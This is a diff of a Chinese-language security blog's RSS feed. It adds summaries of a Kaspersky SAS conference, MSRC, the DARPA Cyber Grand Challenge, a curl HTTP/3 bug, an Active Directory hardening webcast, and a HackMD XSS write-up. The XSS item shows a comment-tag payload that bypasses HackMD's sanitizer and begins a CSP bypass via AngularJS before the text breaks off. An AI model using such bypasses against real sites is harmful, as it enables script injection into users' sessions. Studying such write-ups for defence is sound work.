@@ -7,7 +7,1692 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Tue, 05 Aug 2025 21:44:03 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 06 Aug 2025 18:41:57 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>卡巴斯基SAS &#39;23峰会：全球网络安全威胁洞察与前沿技术分享</title>
+        <link>http://localhost:1313/p/%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BAsas-23%E5%B3%B0%E4%BC%9A%E5%85%A8%E7%90%83%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%B4%9E%E5%AF%9F%E4%B8%8E%E5%89%8D%E6%B2%BF%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/</link>
+        <pubDate>Wed, 06 Aug 2025 18:41:57 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BAsas-23%E5%B3%B0%E4%BC%9A%E5%85%A8%E7%90%83%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%B4%9E%E5%AF%9F%E4%B8%8E%E5%89%8D%E6%B2%BF%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/</guid>
+        <description>&lt;h3 id=&#34;卡巴斯基sas-23参会纪实&#34;&gt;卡巴斯基SAS &amp;lsquo;23参会纪实
+&lt;/h3&gt;&lt;p&gt;作为长期关注网络安全领域的从业者，我始终认为参与各类安全会议能获得独特的行业视角。卡巴斯基安全分析师峰会(SAS)在我的待参加清单上已停留多年——2018-2019年因优先级冲突未能成行，2020年提交的《旅游业网络犯罪生态》演讲虽获通过，却因疫情导致会议取消。直到2023年，这场暌违已久的峰会终于在泰国普吉岛重启，让我得以亲历这场精致而精彩的安全盛会。&lt;/p&gt;
+&lt;h4 id=&#34;小而精的技术盛宴&#34;&gt;小而精的技术盛宴
+&lt;/h4&gt;&lt;p&gt;尽管规模仅数百人，但会议内容令人惊叹。从鲜为人知的APT组织到创新研究议题，更有机会与各国CERT成员及罕见出席欧美会议的安全研究者交流。整个活动组织精良，充满惊喜环节。对来自欧美背景的安全从业者而言，这是了解全球威胁态势的绝佳窗口——无论是防御方还是攻击方视角，会议呈现的TTPs（战术、技术和程序）和内容都具有独特价值。&lt;/p&gt;
+&lt;p&gt;正如尤金·卡巴斯基在活动中强调的，优秀安全会议需具备三大要素：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;新颖创新的安全研究内容&lt;/li&gt;
+&lt;li&gt;利于专注技术交流的会议环境&lt;/li&gt;
+&lt;li&gt;趣味性体验
+SAS &amp;lsquo;23在这三方面都交出了完美答卷。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;精选技术议题&#34;&gt;精选技术议题
+&lt;/h4&gt;&lt;p&gt;以下五场演讲尤其引人入胜（按技术价值排序）：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;《StripedFly：穿越蓝色疆域追寻永恒奇观》&lt;/strong&gt;&lt;br&gt;
+卡巴斯基GReAT团队Sergey Belov和Sergey Lozhkin揭秘了这种长期潜伏的复杂恶意软件架构。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;《通往空间圣殿的闸门几何？入侵者挖掘的隧道形态分析》&lt;/strong&gt;&lt;br&gt;
+KZ-CERT的Askar Dyussekeyev展示了新型网络渗透技术的拓扑特征。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;《TetrisPhantom行动：精密威胁活动的秘密挖掘》&lt;/strong&gt;&lt;br&gt;
+卡巴斯基GReAT的Noushin Shabab解构了该攻击活动的技术实现链条。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;《三角测量行动：线索拼图》&lt;/strong&gt;&lt;br&gt;
+卡巴斯基Igor Kuznetsov完整还原了这次著名攻击行动的战术协同。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;《太空海盗：隐私掠夺者》&lt;/strong&gt;&lt;br&gt;
+Positive Technologies的Denis Kuvshinov揭示了卫星通信系统中的安全缺陷。&lt;/p&gt;
+&lt;p&gt;（原文包含社交媒体分享模块及博客导航信息，此处从略）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>MSRC内部揭秘：以客户为中心的安全事件响应机制</title>
+        <link>http://localhost:1313/p/msrc%E5%86%85%E9%83%A8%E6%8F%AD%E7%A7%98%E4%BB%A5%E5%AE%A2%E6%88%B7%E4%B8%BA%E4%B8%AD%E5%BF%83%E7%9A%84%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E6%9C%BA%E5%88%B6/</link>
+        <pubDate>Wed, 06 Aug 2025 18:25:29 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/msrc%E5%86%85%E9%83%A8%E6%8F%AD%E7%A7%98%E4%BB%A5%E5%AE%A2%E6%88%B7%E4%B8%BA%E4%B8%AD%E5%BF%83%E7%9A%84%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E6%9C%BA%E5%88%B6/</guid>
+        <description>&lt;h3 id=&#34;微软安全响应体系概述&#34;&gt;微软安全响应体系概述
+&lt;/h3&gt;&lt;p&gt;微软安全响应中心(MSRC)作为网络防御运营中心(CDOC)的核心组件，整合了公司内部安全专家资源，提供7×24小时实时威胁防护。CDOC可直接调动微软数千名安全专家、数据科学家和产品工程师，实现安全威胁的快速响应与处置。&lt;/p&gt;
+&lt;h3 id=&#34;ssirp响应计划演进&#34;&gt;SSIRP响应计划演进
+&lt;/h3&gt;&lt;p&gt;2004年在冲击波(Blaster)、震荡波(Sasser)等蠕虫病毒爆发后，微软正式建立软件与服务事件响应计划(SSIRP)，用于规范针对客户的高级威胁响应流程。该机制在近年应对Spectre/Meltdown漏洞和WannaCry勒索软件等重大事件中持续发挥核心作用。&lt;/p&gt;
+&lt;h3 id=&#34;主动防御技术体系&#34;&gt;主动防御技术体系
+&lt;/h3&gt;&lt;p&gt;MSRC团队开发的安全开发生命周期(SDL)已成为行业标准，通过12项最佳实践确保产品安全：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;漏洞消除&lt;/strong&gt;：采用消除攻击面的核心技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;利用阻断&lt;/strong&gt;：通过纵深防御技术限制任意代码执行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;威胁遏制&lt;/strong&gt;：沙箱技术隔离攻击影响范围&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;响应协同&lt;/strong&gt;：Windows Defender与行业伙伴威胁情报联动&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;漏洞经济对抗策略&#34;&gt;漏洞经济对抗策略
+&lt;/h3&gt;&lt;p&gt;通过协调漏洞披露(CVD)机制与漏洞赏金计划，微软推动形成更安全的生态系统：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MAPP计划确保行业伙伴同步获得漏洞防护方案&lt;/li&gt;
+&lt;li&gt;近年已实现漏洞修复率持续上升，实际利用数量显著下降&lt;/li&gt;
+&lt;li&gt;每年处理数十起涉及Azure/O365等云服务的重大安全事件&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>迎战DARPA网络挑战赛：Trail of Bits的自动化安全系统征程</title>
+        <link>http://localhost:1313/p/%E8%BF%8E%E6%88%98darpa%E7%BD%91%E7%BB%9C%E6%8C%91%E6%88%98%E8%B5%9Btrail-of-bits%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%E5%BE%81%E7%A8%8B/</link>
+        <pubDate>Wed, 06 Aug 2025 17:10:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E8%BF%8E%E6%88%98darpa%E7%BD%91%E7%BB%9C%E6%8C%91%E6%88%98%E8%B5%9Btrail-of-bits%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%E5%BE%81%E7%A8%8B/</guid>
+        <description>&lt;p&gt;我们很自豪地宣布，Trail of Bits成为DARPA网络挑战赛中仅有的7支获得资助赛道提案的团队之一。&lt;/p&gt;
+&lt;p&gt;来自学术界、工业界和更广泛安全社区的计算机安全专家已组成30多支团队，将参与这项史无前例的竞赛——DARPA网络挑战赛旨在加速开发能实时抵御网络攻击的自动化安全系统。DARPA今日同时宣布，已达成协议将2016年总决赛与世界顶级计算机安全会议DEF CON同期举办。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;官方信息渠道&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;DARPA%e9%93%be%e6%8e%a5&#34; &gt;项目概述&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;DARPA%e9%93%be%e6%8e%a5&#34; &gt;今日新闻稿&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;Reddit问答&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;媒体报道精选&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;《纽约时报》：自动化网络安全时代来临&lt;/li&gt;
+&lt;li&gt;《CBS新闻》：200万美元悬赏智能网络安全方案&lt;/li&gt;
+&lt;li&gt;《华尔街日报》：美军启动计算机对战黑客竞赛&lt;/li&gt;
+&lt;li&gt;《Ars Technica》：DARPA为DEF CON 2016筹备200万美元网络攻防战&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;我们的参赛项目与自主研发的Javelin系统深度结合，这套自动化系统专为企业级网络攻击模拟而设计。我们集结了软件安全、夺旗赛（CTF）和程序分析领域的国际顶尖专家团队。尽管祝愿其他参赛队伍好运，但Trail of Bits志在必得。竞技场见！&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;若喜欢本文，请通过以下平台分享：&lt;/em&gt;&lt;br&gt;
+[Twitter] [LinkedIn] [GitHub] [Mastodon] [Hacker News]&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>curl HTTP/3/QUIC 中的 TLS 密码套件配置问题</title>
+        <link>http://localhost:1313/p/curl-http/3/quic-%E4%B8%AD%E7%9A%84-tls-%E5%AF%86%E7%A0%81%E5%A5%97%E4%BB%B6%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</link>
+        <pubDate>Wed, 06 Aug 2025 16:53:44 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/curl-http/3/quic-%E4%B8%AD%E7%9A%84-tls-%E5%AF%86%E7%A0%81%E5%A5%97%E4%BB%B6%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</guid>
+        <description>&lt;h1 id=&#34;tls-cipher-misconfiguration-in-http3quic-support&#34;&gt;TLS Cipher Misconfiguration in HTTP/3/QUIC Support
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
+&lt;/h2&gt;&lt;p&gt;当使用curl命令的&lt;code&gt;--ciphers&lt;/code&gt;选项手动指定TLS密码套件时，会导致HTTP/3或QUIC功能失效。这是因为QUIC协议不依赖于TLS 1.2或更早版本定义的传统TLS密码套件，从而导致在尝试访问仅支持HTTP/3/QUIC的端点时出现连接失败。&lt;/p&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;curl实现问题&lt;/strong&gt;：&lt;br&gt;
+curl的&lt;code&gt;--ciphers&lt;/code&gt;选项无法区分传统TLS协议（TLS 1.2/1.3）和QUIC协议，当指定不兼容的密码套件时会导致配置冲突。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;协议不匹配&lt;/strong&gt;：&lt;br&gt;
+HTTP/3使用QUIC协议，而QUIC无法与传统TLS密码套件（通过&lt;code&gt;--ciphers&lt;/code&gt;选项指定）协同工作。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl 8.11.1 (x86_64-pc-linux-gnu) 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;libcurl/8.11.1 OpenSSL/3.3.2 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP TrackMemory UnixSockets zstd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --disable -v --http3-only --ciphers &lt;span class=&#34;s1&#34;&gt;&amp;#39;ECDHE-ECDSA-AES128-GCM-SHA256:...&amp;#39;&lt;/span&gt; https://1.1.1.1/cdn-cgi/trace
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;错误输出&#34;&gt;错误输出
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* QUIC connect to 1.1.1.1 port 443 failed: Could not use specified SSL cipher
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* Failed to connect to 1.1.1.1 port 443 after 0 ms: Could not use specified SSL cipher
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;用户在使用&lt;code&gt;--ciphers&lt;/code&gt;选项尝试建立HTTP/3/QUIC连接时会遭遇连接失败。&lt;/li&gt;
+&lt;li&gt;可能破坏依赖curl与HTTP/3/QUIC服务器交互的自动化脚本。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接
+&lt;/h2&gt;&lt;hr&gt;
+</description>
+        </item>
+        <item>
+        <title>网络安全实战：持续探索阻断攻击链的最佳实践</title>
+        <link>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%81%E7%BB%AD%E6%8E%A2%E7%B4%A2%E9%98%BB%E6%96%AD%E6%94%BB%E5%87%BB%E9%93%BE%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</link>
+        <pubDate>Wed, 06 Aug 2025 15:04:29 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%81%E7%BB%AD%E6%8E%A2%E7%B4%A2%E9%98%BB%E6%96%AD%E6%94%BB%E5%87%BB%E9%93%BE%E7%9A%84%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</guid>
+        <description>&lt;h3 id=&#34;核心内容更新&#34;&gt;核心内容更新
+&lt;/h3&gt;&lt;p&gt;Jordan和Kent基于此前广受好评的《阻断攻击链的组策略》和《让攻击者沮丧的Active Directory最佳实践》网络研讨会，整合了一年来的新发现。安全防御技术时而缓慢演进，时而快速迭代，本次将重点讨论：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;必须部署的基础防御配置&lt;/li&gt;
+&lt;li&gt;降低平均检测时间(MTTD)的实战方法&lt;/li&gt;
+&lt;li&gt;如何有效提升网络和域的安全性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;技术要点时间轴&#34;&gt;技术要点时间轴
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;00:00&lt;/strong&gt; 主题演讲开始&lt;br&gt;
+&lt;strong&gt;02:15&lt;/strong&gt; 年度技术变化分析&lt;br&gt;
+&lt;strong&gt;06:31&lt;/strong&gt; 攻击链深度解析&lt;br&gt;
+&lt;strong&gt;07:47&lt;/strong&gt; Active Directory防御实践&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;09:22&lt;/strong&gt; 实施前提条件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;13:31&lt;/strong&gt; AD核心配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;16:16&lt;/strong&gt; 组织单元与策略架构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;17:47&lt;/strong&gt; 二层协议安全&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;20:53&lt;/strong&gt; LLMNR/NBNS/WPAD漏洞处置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;34:34&lt;/strong&gt; NBNS特定防护&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;35:17&lt;/strong&gt; WPAD攻击缓解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;37:05&lt;/strong&gt; 文件共享安全&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;39:48&lt;/strong&gt; SMB签名强制实施&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;41:26&lt;/strong&gt; IPv6风险管控&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;42:17&lt;/strong&gt; 高级防护技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;LDAP通道绑定&lt;/li&gt;
+&lt;li&gt;微软商店限制&lt;/li&gt;
+&lt;li&gt;本地管理员管控(45:07)&lt;/li&gt;
+&lt;li&gt;网络登录加固(45:51)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;48:59&lt;/strong&gt; 应用控制与勒索软件防护&lt;br&gt;
+&lt;strong&gt;50:48&lt;/strong&gt; 防火墙策略优化&lt;br&gt;
+&lt;strong&gt;52:29&lt;/strong&gt; 蜜罐账户部署&lt;br&gt;
+&lt;strong&gt;53:19&lt;/strong&gt; 网络流量分析技术&lt;br&gt;
+&lt;strong&gt;54:45&lt;/strong&gt; 凭证保护方案&lt;/p&gt;
+&lt;h3 id=&#34;资源获取&#34;&gt;资源获取
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://discord.gg/bhis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;加入BHIS Discord社区&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;原始技术资料：
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/webcast-group-policies-that-kill-kill-chains/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;攻击链阻断指南&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/webcast-group-policies-that-kill-kill-chains/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Active Directory防御手册&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>HackMD上的可蠕虫化XSS漏洞分析与利用</title>
+        <link>http://localhost:1313/p/hackmd%E4%B8%8A%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
+        <pubDate>Wed, 06 Aug 2025 13:58:10 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/hackmd%E4%B8%8A%E7%9A%84%E5%8F%AF%E8%A0%95%E8%99%AB%E5%8C%96xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
+        <description>&lt;h1 id=&#34;hackmd上的可蠕虫化xss漏洞&#34;&gt;HackMD上的可蠕虫化XSS漏洞
+&lt;/h1&gt;&lt;p&gt;在Web安全领域，我通常更偏爱服务器端漏洞而非客户端漏洞（当然能直接获取shell的客户端漏洞除外XD）。但这次发现的XSS漏洞确实有些特别，因此决定分享这个有趣的发现。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞背景&#34;&gt;漏洞背景
+&lt;/h2&gt;&lt;p&gt;HackMD是一款由台湾开发者打造的Markdown协作平台，被COSCUP、g0v、HITCON等知名研讨会用作官方共笔平台，甚至还是Ethereum的协作平台。其开源代码在GitHub上获得了4500多颗星。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞成因&#34;&gt;漏洞成因
+&lt;/h2&gt;&lt;p&gt;漏洞位于HackMD前端渲染Markdown时的XSS防御机制中。平台使用npm/xss库进行防护，但在处理HTML注释标签时存在缺陷：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;onIgnoreTag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;!--&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 不过滤注释属性
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过构造特殊注释标签可绕过过滤：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- foo=&amp;#34;bar--&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Hi&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34; --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;csp绕过&#34;&gt;CSP绕过
+&lt;/h2&gt;&lt;p&gt;HackMD实施了严格的内容安全策略(CSP)，但允许加载cdnjs.cloudflare.com的脚本。利用AngularJS库可以轻松绕过：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
